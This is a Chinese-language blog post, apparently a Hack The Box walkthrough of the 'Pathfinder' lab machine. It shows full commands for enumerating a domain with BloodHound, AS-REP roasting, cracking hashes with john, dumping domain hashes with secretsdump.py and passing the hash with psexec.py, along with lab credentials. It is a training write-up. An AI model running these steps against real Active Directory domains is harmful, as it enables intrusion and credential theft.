@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/pathfinder.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="Hackthebox-Pathfinder - F0rmat&#39;s Blog">
+    <meta property="og:title" content="Hackthebox-Pathfinder - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="Hackthebox-Pathfinder - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 前面的所有密码： Archetype： Mssql:M3g4c0rp123 Administrator:MEGACORP_4dm1n!! Oopsie Mysql:M3g3C0rpUs3r! ftp:mc@F1l3ZilL4 Vaccine Zip:741852963 Web:qwerty789 postgres:P@s5w0rd! Shield domain：Sandra：Password1234! 0x01 过程 1、信息收集 nma">
+    <meta property="og:description" content="0x00 前言 前面的所有密码： Archetype： Mssql:M3g4c0rp123 Administrator:MEGACORP_4dm1n!! Oopsie Mysql:M3g3C0rpUs3r! ftp:mc@F1l3ZilL4 Vaccine Zip:741852963 Web:qwerty789 postgres:P@s5w0rd! Shield domain：Sandra：Password1234! 0x01 过程 1、信息收集 nma">
+    <meta property="twitter:description" content="0x00 前言 前面的所有密码： Archetype： Mssql:M3g4c0rp123 Administrator:MEGACORP_4dm1n!! Oopsie Mysql:M3g3C0rpUs3r! ftp:mc@F1l3ZilL4 Vaccine Zip:741852963 Web:qwerty789 postgres:P@s5w0rd! Shield domain：Sandra：Password1234! 0x01 过程 1、信息收集 nma">
+    <meta property="og:type" content="article">
+    <title>Hackthebox-Pathfinder - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/pathfinder.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/pathfinder.html" title="Hackthebox-Pathfinder">Hackthebox-Pathfinder</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2020-12-19 01:00:00 &#43;0200">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 19 Dec 2020
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            3006 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            6 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-过程">0x01 过程</a>
+      <ul>
+        <li><a href="#1信息收集">1、信息收集</a></li>
+        <li><a href="#2获取权限">2、获取权限</a></li>
+        <li><a href="#3提权">3、提权</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>前面的所有密码：</p>
+<ul>
+<li>
+<p>Archetype：</p>
+<p>Mssql:M3g4c0rp123</p>
+<p>Administrator:MEGACORP_4dm1n!!</p>
+</li>
+<li>
+<p>Oopsie</p>
+<p>Mysql:M3g3C0rpUs3r!</p>
+<p>ftp:mc@F1l3ZilL4</p>
+</li>
+<li>
+<p>Vaccine</p>
+<p>Zip:741852963</p>
+<p>Web:qwerty789</p>
+<p>postgres:P@s5w0rd!</p>
+</li>
+<li>
+<p>Shield</p>
+<p>domain：Sandra：Password1234!</p>
+</li>
+</ul>
+<h1 id="0x01-过程">0x01 过程</h1>
+<h2 id="1信息收集">1、信息收集</h2>
+<p>nmap收集信息：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/1.png" alt="1"></p>
+<p>可以看到开放了88（kerberos）、389（ldap）、3268（全局编录端口），可以判断着一台可能是域控（Domain controller）。</p>
+<!-- raw HTML omitted -->
+<p>既然在上一台靶机获得了域用户的账号密码，那就用来登陆这一台主机看看，首先用的是Psexec工具，在kali上面Impacket工具已经包含了这个脚本Psexec.py</p>
+<p>语法是：</p>
+<p><code>psexec.py [[domain/] username [: password] @] [Target IP Address]</code></p>
+<p>很奇怪，登陆了居然是system，那下面就不用打下去了～</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/2.png" alt="2"></p>
+<p>应该是共享靶机的问题吧，那先按正常流程走一遍，之前我也用这种方式登陆过，但是也出现了认证的错误。</p>
+<p>遇到域我已经大半年没有搞过技术了，有点生疏，顺便复习了一遍，写了一篇笔记：
+<a href="https://getshe11.com/2020/12/16/Domain-security/">https://getshe11.com/2020/12/16/Domain-security/</a></p>
+<p>我看了walkthrough里面一开始就使用bloodhound去枚举域信息，收集域信息，看下有哪些账户是存在配置缺陷之类的，想了解一下bloodhound是什么可以看官方文档：
+<a href="https://bloodhound.readthedocs.io/en/latest/index.html">https://bloodhound.readthedocs.io/en/latest/index.html</a></p>
+<p>安装地址：
+<a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></p>
+<p>为什么要用python版本的bloodhound？因为我们直接用psexec是登陆不上去的，而且也没有开3389端口，也就你无法放exe和ps1的脚本放上去执行</p>
+<p>GitHub主页也没什么使用方法，直接命令-h查看参数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
+</span></span><span class="line"><span class="cl">                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
+</span></span><span class="line"><span class="cl">                         [--dns-tcp] [-d DOMAIN] [-dc HOST] [-gc HOST]
+</span></span><span class="line"><span class="cl">                         [-w WORKERS] [-v] [--disable-pooling]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Python based ingestor for BloodHound
+</span></span><span class="line"><span class="cl">For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">optional arguments:
+</span></span><span class="line"><span class="cl">  -h, --help            show this help message and exit
+</span></span><span class="line"><span class="cl">  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD//这个参数是指定收集的信息，默认是全部都收集
+</span></span><span class="line"><span class="cl">                        Which information to collect. Supported: Group,
+</span></span><span class="line"><span class="cl">                        LocalAdmin, Session, Trusts, Default (all previous),
+</span></span><span class="line"><span class="cl">                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
+</span></span><span class="line"><span class="cl">                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
+</span></span><span class="line"><span class="cl">                        You can specify more than one by separating them with
+</span></span><span class="line"><span class="cl">                        a comma. (default: Default)
+</span></span><span class="line"><span class="cl">  -u USERNAME, --username USERNAME //用户名
+</span></span><span class="line"><span class="cl">                        Username. Format: username[@domain]; If the domain is
+</span></span><span class="line"><span class="cl">                        unspecified, the current domain is used.
+</span></span><span class="line"><span class="cl">  -p PASSWORD, --password PASSWORD //密码
+</span></span><span class="line"><span class="cl">                        Password
+</span></span><span class="line"><span class="cl">  -k, --kerberos        Use kerberos //本机已有凭证可使用该函数
+</span></span><span class="line"><span class="cl">  --hashes HASHES       LM:NLTM hashes// 使用NLTM进行登陆
+</span></span><span class="line"><span class="cl">  -ns NAMESERVER, --nameserver NAMESERVER //指定DNS服务器
+</span></span><span class="line"><span class="cl">                        Alternative name server to use for queries
+</span></span><span class="line"><span class="cl">  --dns-tcp             Use TCP instead of UDP for DNS queries //使用tcp
+</span></span><span class="line"><span class="cl">  -d DOMAIN, --domain DOMAIN //指定域
+</span></span><span class="line"><span class="cl">                        Domain to query.
+</span></span><span class="line"><span class="cl">  -dc HOST, --domain-controller HOST //指定域控服务器
+</span></span><span class="line"><span class="cl">                        Override which DC to query (hostname)
+</span></span><span class="line"><span class="cl">  -gc HOST, --global-catalog HOST //指定全局编录服务器
+</span></span><span class="line"><span class="cl">                        Override which GC to query (hostname)
+</span></span><span class="line"><span class="cl">  -w WORKERS, --workers WORKERS //指定工作组
+</span></span><span class="line"><span class="cl">                        Number of workers for computer enumeration (default:
+</span></span><span class="line"><span class="cl">                        10)
+</span></span><span class="line"><span class="cl">  -v                    Enable verbose output //详细信息输出
+</span></span><span class="line"><span class="cl">  --disable-pooling     Don&#39;t use subprocesses for ACL parsing (only for
+</span></span><span class="line"><span class="cl">                        debugging purposes)
+</span></span></code></pre></div><p>官方抛出一天命令来收集信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodhound-python -d megacorp.local -u sandra -p &#34;Password1234!&#34; -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
+</span></span></code></pre></div><ul>
+<li>
+<p>-d megacorp.local //这里的域怎么得来？</p>
+<p>1.在Shield靶机上面查询得知2.nmap扫描的时候看到运行3268端口和389都有域信息输出</p>
+</li>
+<li>
+<p>-u sandra -p &ldquo;Password1234!&rdquo; //在Shield靶机获取到的域用户</p>
+</li>
+<li>
+<p>-gc pathfinder.megacorp.local // pathfinder主机名怎么得来？</p>
+<p>1.在Shield靶机执行mimikatz上面得知Logon Server：PATHFINDER</p>
+<p>2.这个参数有什么用？可以在官方查询：
+<a href="https://docs.microsoft.com/en-us/windows/win32/ad/global-catalog">https://docs.microsoft.com/en-us/windows/win32/ad/global-catalog</a> 资料得知是全局编录服务器，还可以阅读下AD域服务的文章：
+<a href="https://www.secpulse.com/archives/82876.html">https://www.secpulse.com/archives/82876.html</a>
+意思就是说：指定GC服务器就不需要花更多的时间去域林中搜索对象所在的域，加快枚举的速度,可以连接到3268端口进行枚举</p>
+<p><a href="https://github.com/fox-it/BloodHound.py/blob/fd793b94d6e3a4238c5451ab76915bce59ae5ed0/bloodhound/ad/authentication.py#L46">https://github.com/fox-it/BloodHound.py/blob/fd793b94d6e3a4238c5451ab76915bce59ae5ed0/bloodhound/ad/authentication.py#L46</a></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/5.png" alt="5"></p>
+</li>
+<li>
+<p>-c all //收集全部信息</p>
+</li>
+<li>
+<p>-ns 10.10.10.30 //指定DNS解析服务器</p>
+</li>
+</ul>
+<p>建议在晚上收集，因为白天网络实在太卡了。。之前执行的命令窗口找不到了，用官方的图代替一下：
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/3.webp" alt="3"></p>
+<p>bloodhound.py是采集器，bloodhound工作是需要neo4j数据库，使用以下命令安装：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt install neo4j
+</span></span><span class="line"><span class="cl">apt install bloodhound
+</span></span></code></pre></div><p>启动neo4j：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">neo4j start console
+</span></span></code></pre></div><p>因为首次登陆需要重新设置密码，打开http://localhost:7474/</p>
+<p>初始密码是neo4j:neo4j</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/4.png" alt="4"></p>
+<p>修改完密码后打开bloodhound：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodhound --no-sandbox
+</span></span></code></pre></div><p>输入刚才更改的密码：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/6.png" alt="6"></p>
+<p>按旁边的upload data上传刚才bloodhound.py收集到的4个文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/7.png" alt="7"></p>
+<p>查询参数,可以参考文章学习：
+<a href="https://eviladan0s.github.io/2020/06/04/bloodhound-learn/">https://eviladan0s.github.io/2020/06/04/bloodhound-learn/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Find all Domain Admins                                查找所有域管理员
+</span></span><span class="line"><span class="cl">Find Shortest Paths to Domain Admins                  查找域管理员的最短路径
+</span></span><span class="line"><span class="cl">Find Principals with DCSync Rights                    查找具有DCSync权限的主体
+</span></span><span class="line"><span class="cl">Users with Foreign Domain Group Membership            具有外域组成员身份的用户
+</span></span><span class="line"><span class="cl">Groups with Foreign Domain Group Membership           具有外域组成员身份的组
+</span></span><span class="line"><span class="cl">Map Domain Trusts                                     域信任映射图
+</span></span><span class="line"><span class="cl">Shortest Paths to Unconstrained Delegation Systems    到达无约束委派系统的最短路径
+</span></span><span class="line"><span class="cl">Shortest Paths from Kerberoastable Users              来自Kerberoastable用户的最短路径
+</span></span><span class="line"><span class="cl">Shortest Paths to Domain Admins from Kerberoastable Users  可通过Kerberoastable用户访问域管理员的最短路径
+</span></span><span class="line"><span class="cl">Shortest Path from Owned Principals                   已拥有权限最短路径
+</span></span><span class="line"><span class="cl">Shortest Paths to Domain Admins from Owned Principals 已拥有权限到域管理员的最短路径
+</span></span><span class="line"><span class="cl">Shortest Paths to High Value Targets                  高价值目标的最短路径
+</span></span><span class="line"><span class="cl">List Computers where Domain Users are Local Admin     列出域用户是本地管理员的计算机
+</span></span><span class="line"><span class="cl">Shortest Paths from Domain Users to High Value Targets 从域用户到高价值目标的最短路径
+</span></span><span class="line"><span class="cl">Find All Paths from Domain Users to High Value Targets 查找从域用户到高价值目标的所有路径
+</span></span><span class="line"><span class="cl">Find Workstations where Domain Users can RDP to       查找域用户可以通过RDP到达的工作站
+</span></span><span class="line"><span class="cl">Find Servers where Domain Users can RDP to            查找域用户可以使用RDP进行访问的服务器
+</span></span><span class="line"><span class="cl">Find all other Rights Domain Users shouldn’t have     查找所有正常的域用户不应有的权限
+</span></span><span class="line"><span class="cl">Find Kerberoastable members of High Value Groups      查找高价值用户组的Kerberoastable成员
+</span></span><span class="line"><span class="cl">List all Kerberoastable Accounts                      列出所有Kerberoastable账户
+</span></span><span class="line"><span class="cl">Find Kerberoastable Users with most privileges        查找拥有最多特权的Kerberoastable用户
+</span></span><span class="line"><span class="cl">Find Domain Admin Logons to non-Domain Controllers    查找域管理员登录到非域控制器
+</span></span><span class="line"><span class="cl">Find unsupported OSs                                  查找不受支持的操作系统
+</span></span><span class="line"><span class="cl">Find AS-REP Roastable Users (DontReqPreAuth)          查找AS-REP可被破解的用户
+</span></span></code></pre></div><p>这里主要使用Find Principals with DCSync Rights和Find AS-REP Roastable Users (DontReqPreAuth) ：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/8.webp" alt="8"></p>
+<p>1、Find Principals with DCSync Rights</p>
+<p>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash，可以看到SVC_BES域用户对域控是拥有GetcangAll权限，具体原理可以看
+<a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
+和
+<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p>
+<p>2、Find AS-REP Roastable Users (DontReqPreAuth)</p>
+<p>查看是否存在AS-REPRoasting漏洞的账户，具体可以看
+<a href="https://getshe11.com/2020/12/16/Domain-security/#AS-REPRoasting">https://getshe11.com/2020/12/16/Domain-security/#AS-REPRoasting</a></p>
+<h2 id="2获取权限">2、获取权限</h2>
+<p>利用刚才存在AS-REPRoasting漏洞的账户获取TGT票据进行解密,使用Impacket里面的GetNPUsers.py，关于Impacket的使用说明可以参考：
+<a href="https://blog.csdn.net/weixin_30877755/article/details/96203724">https://blog.csdn.net/weixin_30877755/article/details/96203724</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
+</span></span></code></pre></div><p>借用一下官方图，获取到svc_bes的TGT 票据：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/9.webp" alt="9"></p>
+<p>可以使用hashcat或者John破解,hash是上面获取到的密文：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john hash -wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解出密码：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/10.webp" alt="10"></p>
+<p>接下来官方介绍了一款非常牛逼的工具evil-winrm，其实在一开始我们就可以用这个工具进行操作，上传exe或者poweshell版本的bloodhound，毕竟python版本的bloodhound功能有限，具体用法可以看：
+<a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+<p>安装与连接：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gem install evil-winrm
+</span></span><span class="line"><span class="cl">evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+</span></span></code></pre></div><h2 id="3提权">3、提权</h2>
+<p>登陆域用户svc_bes后毕竟是没有管理员权限的，我们最终的目标是读取到administrator用户桌面的文件root.txt：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/11.png" alt="11"></p>
+<p>可以使用Impacket里面的secretsdump.py工具导出hash：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/12.webp" alt="12"></p>
+<p>然后使用psexec.py登陆服务器：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">psexec.py megacorp.local/administrator@10.10.10.30 -hashes &lt;NTML hash&gt;:&lt;NTLM hash&gt;
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/13.webp" alt="13"></p>
+<p>这里奇怪的是我用Sandra域用户照样可以导出域的全面用户hash：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/14.png" alt="13"></p>
+<p>后来也查了一下这个用户的权限，属于本地管理员还有域用户，太久了不太记得之前是什么权限了，我记得是有些权限它没有的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/15.png" alt="15"></p>
+<h1 id="0x03-总结">0x03 总结</h1>
+<ul>
+<li>
+<p>判断是否开了这三个端口88（kerberos）、389（ldap）、3268（全局编录端口），如果开了是域控的可能性很大</p>
+</li>
+<li>
+<p>psexec工具使用，可以使用hash或者账户密码登陆</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">psexec.py [[domain/] username [: password] @] [Target IP Address]
+</span></span></code></pre></div></li>
+<li>
+<p>bloodhound工具使用</p>
+<p>如果已经拿到域用户可以登陆主机上传exe或者ps1的执行收集数据，远程的话可以使用python版本的，但是不是全部收集功能都支持</p>
+</li>
+<li>
+<p>3389登陆问题，我之后拿到域控权限又开启了3389的连接，想登陆用图形界面看下里面的环境配置：</p>
+<p>但发现登陆出现了一下问题：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/16.png" alt="16"></p>
+<p>一开始还以为是rdesktop的问题，后来查资料是没有开这个选项：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/17.webp" alt="17"></p>
+</li>
+<li>
+<p>其他漏洞总结我都写在这一篇里面了：
+<a href="https://getshe11.com/2020/12/16/Domain-security/">https://getshe11.com/2020/12/16/Domain-security/</a></p>
+</li>
+</ul>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/pathfinder.html">https://xxe.icu/pathfinder.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/hackthebox.html">
+                    #hackthebox
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/shield.html" class="underline text-yellow-600">Hackthebox-Shield</a></li>
+    
+    <li><a href="/archetype.html" class="underline text-yellow-600">Hackthebox-Archetype</a></li>
+    
+    <li><a href="/oopsie.html" class="underline text-yellow-600">Hackthebox-Oopsie</a></li>
+    
+    <li><a href="/vaccine.html" class="underline text-yellow-600">Hackthebox-Vaccine</a></li>
+    
+    <li><a href="/domain-security.html" class="underline text-yellow-600">Windows认证与域渗透</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
